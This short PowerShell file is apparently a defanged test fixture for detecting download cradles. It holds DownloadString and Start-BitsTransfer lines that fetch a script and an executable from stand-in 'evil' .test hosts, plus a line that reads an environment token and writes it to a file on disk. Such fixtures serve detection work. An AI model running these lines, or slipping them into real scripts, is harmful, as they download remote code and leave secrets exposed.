# Fixture: PowerShell download cradles + install. All defanged (.test TLD).
$key = $env:PDF_PS_TOKEN

# classic download-and-run cradles
(New-Object Net.WebClient).DownloadString('https://cradle.example-evil.test/payload.ps1')
Start-BitsTransfer -Source 'https://bits.example-evil.test/tool.exe' -Destination 'C:\Temp\tool.exe'

# runtime package install
pip install colorama

Set-Content -Path C:\ProgramData\pdf-helper\ps-state.txt -Value $key
